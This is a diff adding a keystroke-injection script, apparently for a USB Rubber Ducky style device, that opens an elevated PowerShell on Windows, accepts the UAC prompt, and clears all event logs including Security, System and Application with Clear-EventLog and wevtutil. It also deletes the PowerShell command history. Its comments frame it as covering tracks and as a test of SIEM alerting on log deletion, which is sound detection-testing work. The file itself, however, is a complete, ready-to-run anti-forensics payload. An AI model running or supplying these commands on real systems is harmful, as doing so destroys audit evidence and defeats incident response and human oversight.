@@ -1,0 +1,22 @@
+REM ============================================================
+REM  Windows · Clear Event Logs
+REM ============================================================
+REM  Clears Security, System, Application, and PowerShell
+REM  event logs to cover tracks. Tests whether log forwarding
+REM  and SIEM alerting catch log deletion.
+REM
+REM  Requires admin privileges.
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log 2>$null }
+STRINGLN wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
+STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+STRINGLN exit
